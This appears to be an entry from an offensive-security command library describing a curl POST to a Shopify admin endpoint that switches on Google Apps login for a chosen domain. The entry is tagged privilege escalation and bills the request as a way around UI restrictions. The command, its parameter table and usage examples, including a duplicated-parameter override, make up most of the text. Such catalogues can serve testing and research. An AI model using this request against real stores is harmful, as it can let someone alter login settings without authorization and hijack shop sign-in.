---
id: 123e4567-e89b-12d3-a456-426614174002
name: shopify-update-google-apps-login-post
type: command
executor: bash
data: >-
  curl -X POST
  'https://seclearn.myshopify.com/admin/login_services/google_apps/update' -H
  'Host: seclearn.myshopify.com' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2;
  WOW64; rv:37.0) Gecko/20100101 Firefox/37.0' -H 'Cookie: ...' -H
  'Content-Type: application/x-www-form-urlencoded' -d
  'utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.852Z'
platforms:
  - Web
tags:
  - privilege-escalation
  - api
  - post-request
verified: false
validated: true
submitted: true
---

# shopify-update-google-apps-login-post

## Command

```bash
curl -X POST 'https://seclearn.myshopify.com/admin/login_services/google_apps/update' \
  -H 'Host: seclearn.myshopify.com' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0' \
  -H 'Cookie: ...' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save'
```

## Description

This curl command sends a POST request to Shopify's backend to update Google Apps login settings, enabling OAuth integration for a custom domain. It bypasses UI restrictions by directly targeting the API endpoint, requiring valid admin session cookies and CSRF token.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H 'Host: ...'` | Sets the target host header | Yes |
| `-H 'User-Agent: ...'` | Mimics browser user agent for compatibility | Yes |
| `-H 'Cookie: ...'` | Includes session cookies for authentication | Yes |
| `-H 'Content-Type: ...'` | Sets form-encoded content type | Yes |
| `-d 'utf8=...'` | UTF-8 encoding indicator | Yes |
| `-d '_method=patch'` | Simulates PATCH method for update | Yes |
| `-d 'authenticity_token=...'` | CSRF protection token from session | Yes |
| `-d 'shop[google_apps_login_enabled]=1'` | Enables the feature (overrides 0) | Yes |
| `-d 'shop[google_apps_domain]=...'` | Sets custom domain (e.g., securitylearn.net) | Yes |
| `-d 'commit=Save'` | Form submission trigger | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.myshopify.com/admin/login_services/google_apps/update' -H 'Cookie: [cookies]' -H 'Content-Type: application/x-www-form-urlencoded' -d 'authenticity_token=[token]&shop[google_apps_login_enabled]=1&shop[google_apps_domain]=example.net&commit=Save'
```

### Advanced Usage

Include full headers and overwrite previous value:

```bash
curl -X POST 'https://seclearn.myshopify.com/admin/login_services/google_apps/update' -H 'Host: seclearn.myshopify.com' -H 'User-Agent: Mozilla/5.0 ...' -H 'Cookie: ...' -H 'Content-Type: application/x-www-form-urlencoded' -d 'utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop[google_apps_login_enabled]=0&shop[google_apps_login_enabled]=1&shop[google_apps_domain]=securitylearn.net&commit=Save'
```

## Expected Output

Successful response: HTTP 200 OK or 302 redirect with body indicating 'Settings updated successfully' or similar. Failure: 403 Forbidden if auth fails, or 422 Unprocessable if token invalid.

## Related

- [[procedures/Bypass-Shopify-UI-Restrictions-for-Login-Services-Update]]
